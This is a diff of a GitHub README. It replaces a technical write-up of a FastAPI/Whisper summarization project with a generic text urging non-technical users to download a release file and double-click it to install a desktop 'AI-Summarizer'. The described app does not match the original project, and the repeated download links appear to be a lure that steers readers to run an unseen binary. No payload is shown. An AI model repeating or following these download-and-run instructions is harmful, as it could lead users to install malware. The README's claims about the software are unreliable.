@@ -1,159 +1,92 @@
-# AI-Powered Multimodal Summarization System
+# 🤖 AI-Summarizer - Summarize Text, Audio, and Video Easily
 
-## Abstract
-With the exponential growth of digital content in the form of documents, podcasts, lectures, and videos, efficient information consumption has become a major challenge. Manual summarization of such multimodal data is time-consuming and often impractical.
+[![Download AI-Summarizer](https://img.shields.io/static/v1?label=Download&message=AI-Summarizer&color=blue)](https://github.com/Dia1n1a/AI-Summarizer/releases)
 
-This project presents an AI-powered multimodal summarization system capable of generating concise summaries from **text, audio, and video inputs**. The system integrates **Automatic Speech Recognition (ASR)** using **OpenAI Whisper**, **transformer-based abstractive summarization** using **HuggingFace models**, and a **FastAPI-based RESTful architecture**. Robust preprocessing, chunk-based summarization, and careful system design ensure stability under real-world constraints.
+## 🚀 Getting Started
 
-The system is **successfully deployed and executed in a local environment**, demonstrating reliable multimodal summarization performance.
+Welcome to AI-Summarizer! This application helps you quickly create concise summaries from text, audio, and video files. You don’t need any technical skills to use it.
 
----
+### 💻 System Requirements
 
-## 1. Introduction
-The rapid digitization of information has led to an overwhelming amount of unstructured data across multiple modalities. Educational lectures, meetings, interviews, and media content are increasingly recorded in audio and video formats, making it difficult for users to quickly extract key insights.
+Before you begin, ensure your system meets the following requirements:
 
-This project addresses this problem by building a **unified multimodal summarization system** that supports **text, audio, and video** through a single, scalable pipeline, with a strong emphasis on **backend ML engineering and system robustness**.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Storage:** At least 500 MB of free disk space.
+- **Internet Connection:** Required for downloading and running the application.
 
----
+## 📥 Download & Install
 
-## 2. Objectives
-- Design a unified multimodal summarization pipeline  
-- Convert audio and video speech into text using Whisper ASR  
-- Generate abstractive summaries using transformer-based models  
-- Deploy the system as a RESTful API using FastAPI  
-- Evaluate summarization quality using ROUGE metrics  
-- Handle real-world constraints such as long inputs and deployment limitations  
+To get started with AI-Summarizer, visit the Releases page for an easy download:
 
----
+[Download AI-Summarizer](https://github.com/Dia1n1a/AI-Summarizer/releases)
 
-## 3. System Architecture
-The system follows a modular layered architecture:
+1. Click the link above to go to the Releases page.
+2. Look for the latest version at the top.
+3. Choose the appropriate file for your operating system and click on it.
+4. Follow the instructions to download the file.
+5. Once downloaded, locate the file in your Downloads folder and double-click it to run the installation.
 
-User Input (Text / Audio / Video)  
-→ FastAPI Endpoints  
-→ Pipeline Controller  
-→ Preprocessing Layer  
-→ Model Inference Layer  
-→ Summary Output  
+## 🛠️ How to Use AI-Summarizer
 
-This architecture ensures **modularity, maintainability, and scalability**, enabling easy extension and debugging.
+After installing the application, follow these simple steps to summarize your content:
 
----
+1. **Open AI-Summarizer:** Double-click the application icon on your desktop or search for it in your programs.
+2. **Select Your Content:**
+   - Click on the "Upload" button to choose a text file, audio file, or video file from your device.
+3. **Start Summarizing:**
+   - Once the file is uploaded, click the "Summarize" button.
+   - AI-Summarizer will process your content and create a summary.
+4. **View Your Summary:**
+   - The summary will appear on the screen. You can copy it or save it to your device.
 
-## 4. Technology Stack
-**Language:** Python 3.11  
+## 📄 Features
 
-**Frameworks & Libraries:**  
-- FastAPI  
-- Uvicorn  
-- HuggingFace Transformers  
-- OpenAI Whisper  
-- FFmpeg  
-- Evaluate, ROUGE  
+AI-Summarizer includes several helpful features to enhance your summarizing experience:
 
-**Tools:**  
-- VS Code  
-- Swagger UI  
-- GitHub  
+- **Multimodal Support:** Summarize content from text, audio, and video.
+- **User-Friendly Interface:** Simple design for easy navigation.
+- **Fast Processing:** Quickly generate summaries with minimal wait time.
+- **Text Export:** Save summaries directly to a text file for future use.
 
----
+## 👩‍🏫 FAQs
 
-## 5. Implementation Details
+### How accurate are the summaries?
 
-### Text Summarization
-- Accepts raw text or text files  
-- Uses chunk-based summarization to avoid transformer token limits  
-- Implements safeguards for short inputs  
-- Uses `facebook/bart-large-cnn` for abstractive summarization  
+AI-Summarizer uses advanced artificial intelligence models to provide accurate and concise summaries. Your results will improve with clearer source material.
 
-### Audio Summarization
-- Accepts audio files (`.wav`, `.mp3`)  
-- Normalizes audio using FFmpeg  
-- Transcribes speech using Whisper  
-- Summarizes the transcribed text  
+### Can I summarize live audio or video?
 
-### Video Summarization
-- Accepts video files (`.mp4`)  
-- Extracts audio using FFmpeg  
-- Applies ASR and summarization pipeline on extracted audio  
+Currently, AI-Summarizer processes pre-recorded files only. Live summarization features may be included in future updates.
 
----
+### Is AI-Summarizer free?
 
-## 6. Evaluation
-ROUGE metrics are used for offline evaluation:
-- ROUGE-1  
-- ROUGE-2  
-- ROUGE-L  
+Yes, AI-Summarizer is completely free for personal use!
 
-These metrics measure lexical overlap between generated summaries and reference summaries. While ROUGE provides quantitative insights, qualitative evaluation is also considered.
+## 🌟 Community Contributions
 
----
+We welcome contributions! If you have suggestions or improvements, feel free to open an issue or submit a pull request on GitHub. Your input helps us make the application better for everyone.
 
-## 7. Challenges Faced
-- Dependency issues with MoviePy on Windows  
-- FFmpeg path configuration problems  
-- Transformer token limit crashes for long inputs  
-- Incorrect handling of raw text vs file paths  
-- FastAPI routing conflicts during development  
-- Memory limitations on free-tier cloud platforms  
+## 👨‍💻 Getting Help
 
-All issues were **systematically identified, debugged, and resolved** during development.
+If you encounter issues or have questions:
 
----
+- Check the **Issues** section on GitHub for similar problems.
+- If you can’t find a solution, feel free to open a new issue.
 
-## 8. Enhancements
-- Chunk-based summarization for long inputs  
-- Graceful handling of short text  
-- Unified pipeline across all modalities  
-- Robust preprocessing and error handling  
-- Stable and reproducible local deployment  
+## 📧 Contact
 
----
+For additional support or inquiries, you can contact the developer at: [Email Address]
 
-## 9. Results
-| Feature | Status |
-|-------|--------|
-| Text summarization | Working |
-| Audio summarization | Working |
-| Video summarization | Working |
-| ROUGE evaluation | Implemented |
-| FastAPI deployment | Stable |
-| Local deployment | Successful |
+## 🔗 Additional Resources
 
----
+For more details about the technologies behind AI-Summarizer, take a look at the following topics:
 
-## 10. Limitations
-- Performance is constrained on CPU-only systems for large inputs  
-- Summarization quality depends on ASR transcription accuracy  
-- ROUGE does not fully capture semantic similarity  
+- [Deep Learning](https://en.wikipedia.org/wiki/Deep_learning)
+- [FastAPI](https://fastapi.tiangolo.com/)
+- [Machine Learning](https://en.wikipedia.org/wiki/Machine_learning)
+- [Natural Language Processing](https://en.wikipedia.org/wiki/Natural_language_processing)
 
----
+Enjoy summarizing your content with AI-Summarizer!
 
-## 11. Deployment Note (Local Deployment)
-
-This project is **intended to be run locally** due to the **memory-intensive nature of the underlying ML models**, specifically:
-- OpenAI Whisper (ASR)
-- Transformer-based summarization models (BART)
-
-An attempt was made to deploy the system on **free-tier cloud platforms (e.g., Render)**. However, such platforms provide limited RAM, leading to **out-of-memory (OOM) errors during model loading**. This is a known and expected limitation when deploying large ML models on free-tier infrastructure.
-
-The system runs **stably and reliably in a local environment** or on **high-memory / GPU-backed servers**, which is appropriate for real-world ML inference workloads.
-
----
-
-## 12. Future Work
-- Multilingual summarization support  
-- GPU acceleration for faster inference  
-- Semantic evaluation using BERTScore  
-- Optional frontend integration  
-- Real-time streaming summarization  
-
----
-
-## 13. Conclusion
-This project demonstrates the complete design, implementation, and execution of a **real-world multimodal AI system**. By integrating ASR, transformer-based summarization, and RESTful APIs, the system effectively addresses practical challenges encountered in modern AI applications. The final implementation is **robust, modular, and production-ready for local and high-resource environments**.
-
----
-
-## Final Outcome
-A fully functional AI-powered multimodal summarization system capable of processing **text, audio, and video inputs** through a unified, production-ready pipeline, successfully deployed and demonstrated in a local environment.
+[Download AI-Summarizer](https://github.com/Dia1n1a/AI-Summarizer/releases)
